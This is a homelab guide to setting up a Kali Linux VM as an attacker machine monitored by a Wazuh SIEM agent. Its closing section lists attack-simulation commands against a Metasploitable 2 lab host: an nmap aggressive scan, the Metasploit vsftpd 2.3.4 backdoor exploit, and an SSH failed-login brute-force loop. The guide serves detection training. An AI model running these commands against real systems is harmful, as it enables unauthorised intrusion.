# Kali Linux Agent Setup Guide

This guide documents the steps taken to set up Kali Linux as an attacker VM and enroll it as a Wazuh monitored endpoint.

---

## VM Specifications

| Resource | Value |
|---|---|
| OS | Kali Linux (pre-built VMware image) |
| Architecture | amd64 (64-bit) |
| IP Address | 10.1.1.8 |
| Network | Bridged |
| Role | Attacker VM / monitored endpoint |

---

## Step 1 — Download Kali Linux VMware Image

Download the pre-built VMware image from the official Kali website:

```
https://www.kali.org/get-kali/#kali-virtual-machines
```

Select the **VMware** option and download the ZIP file. This saves time compared to installing from ISO as it comes pre-configured with all Kali tools.

---

## Step 2 — Import into VMware Workstation Pro

1. Extract the downloaded ZIP file
2. In VMware go to **File → Open**
3. Browse to the extracted folder and select the `.vmx` file
4. VMware imports it automatically — no setup wizard needed
5. Go to **VM → Settings → Network Adapter**
6. Set to **Bridged: Connected directly to the physical network**
7. Click **OK**

---

## Step 3 — Boot and Log In

Power on the VM and log in with the default credentials:

- **Username:** `kali`
- **Password:** `kali`

> Change the default password immediately after first login:
> ```bash
> passwd
> ```

---

## Step 4 — Fix Mouse Visibility (if needed)

If the mouse cursor is invisible inside the VM, install VMware Tools:

```bash
sudo apt update && sudo apt install -y open-vm-tools-desktop
sudo reboot
```

---

## Step 5 — Check IP Address

Confirm Kali received an IP on the correct subnet:

```bash
hostname -I
```

Should return a `10.1.1.x` address. If not, check that the network adapter is set to Bridged and that VMware is bridging to the correct physical adapter in **Edit → Virtual Network Editor → VMnet0**.

---

## Step 6 — Install the Wazuh Agent

In the Wazuh dashboard go to **Agents → Deploy new agent** and fill in:

- **OS:** Linux — DEB (amd64)
- **Server address:** `10.1.1.3`
- **Agent name:** `kali`

Run the generated command in the Kali terminal:

```bash
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.14.5-1_amd64.deb && sudo WAZUH_MANAGER='10.1.1.3' WAZUH_AGENT_NAME='kali' dpkg -i ./wazuh-agent_4.14.5-1_amd64.deb
```

---

## Step 7 — Start and Enable the Agent

```bash
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

Verify it is running:

```bash
sudo systemctl status wazuh-agent
```

You should see `active (running)` in green.

---

## Step 8 — Verify in Wazuh Dashboard

In the Wazuh dashboard go to **Agents** — Kali should appear with a green **Active** status.

---

## Tools Used for Attack Simulation

### Nmap — Network Reconnaissance
```bash
nmap -A -sV -O 10.1.1.5
```

### Metasploit — Exploitation
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.1.1.5
set LHOST 10.1.1.8
run
```

### SSH Brute Force Loop
```bash
for i in {1..20}; do ssh -o "KexAlgorithms=diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=ssh-rsa" -o "MACs=hmac-sha1" wronguser@10.1.1.5; done
```

### SSH Connection to Metasploitable (legacy flags required)
```bash
ssh -o "KexAlgorithms=diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=ssh-rsa" -o "MACs=hmac-sha1" msfadmin@10.1.1.5
```

> Note: Legacy SSH flags are required because Metasploitable 2 runs an old OpenSSH version that only supports deprecated algorithms.

---

## Result

Kali Linux is enrolled as an active Wazuh agent at `10.1.1.8`, monitored by the Wazuh server at `10.1.1.3`. All activity on the Kali machine is logged and forwarded to the Wazuh dashboard in real time.
